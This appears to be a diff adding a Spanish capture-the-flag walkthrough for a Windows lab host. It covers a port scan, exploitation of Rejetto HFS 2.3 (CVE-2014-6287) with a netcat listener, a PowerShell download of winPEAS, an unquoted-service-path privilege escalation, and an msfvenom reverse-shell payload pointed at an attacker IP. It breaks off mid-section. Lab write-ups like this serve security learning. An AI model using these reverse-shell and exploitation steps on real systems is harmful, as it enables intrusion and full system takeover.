@@ -1,0 +1,65 @@
+
+La maquina no responde al ping(ICMP) por lo que hacemos un escaneo 
+sin enviar trazas ICMP.
+
+
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+8080/tcp  open  http-proxy
+47001/tcp open  winrm
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49161/tcp open  unknown
+49162/tcp open  unknown
+
+8080 : rejetto HFS 2.3
+	
+
+	encontramos un posible exploit para esta version.
+
+	se trata de el CVE-2014-6287
+
+	- Colocamos un nc.exe en el servidor que vamos a compartir y luego 
+	ponemos una escucha en netcat con nc -lvnp <port>.
+
+
+	- Una vez dentro sacamos la flag de user y jalamos winPEAS.exe con el comando :
+
+	powershell -c wget "http://<ip>/winPEAS.exe" -outfile winPEAS.exe
+
+	una vez hecho ejecutamos y vemos que existe un servicio con el nombre de :
+	AdvancedSystemCareService9
+
+	en la que la ruta hacia el servicio tiene espacios y esa es una posible 
+	vulnerabilidad.
+
+	powershell -c Get-Service : este comando es para obtener los servicios 
+	manualmente.
+
+	Vulnerabilidad para escalar privilegios explicacion : 
+
+	https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
+	
+
+	Creando nuestro payload :
+
+		msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.78.26 LPORT=4444 -f exe -o Advanced.exe
+
+	-----------------------------------------------
+
+	ruta :
+	
+	
+
+
+	
+
+	
